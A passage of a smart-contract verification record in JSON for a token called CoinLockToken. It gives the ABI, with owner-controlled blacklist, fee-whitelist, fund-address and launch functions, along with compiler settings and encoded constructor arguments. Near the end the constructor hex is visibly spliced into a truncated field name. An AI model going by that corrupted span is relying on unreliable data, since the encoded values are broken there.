tability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuyAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"multi_bclist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setAirDropEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setAirdropNumbs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setEnableTransferFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addr\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setFeeWhiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setFundAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setSwapPairList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"a\",\"type\":\"uint256\"}],\"name\":\"setkb\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTradeBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "CoinLockToken", "CompilerVersion": "v0.8.4+commit.c7e474f2", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003c00000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000010636f696e6c6f636b2e66696e616e6365000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010636f696e6c6f636b2e66696e616e6365000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e000000000000000000000000cc608d3b9b991c55d54d8e089f73d1dad695eef6000000000000000000000000cc608d3b9b991c55d54d8e089f73d1dad695eef6000000000000000000000000000000000000000000000000000000000000000d000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000052b7d2dcc80cd2ea000000000000000000000000000000000000000000000000108b2a2c2802909400000000000000000000000000000000000000000000000052b7d2dcc80cd2eersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}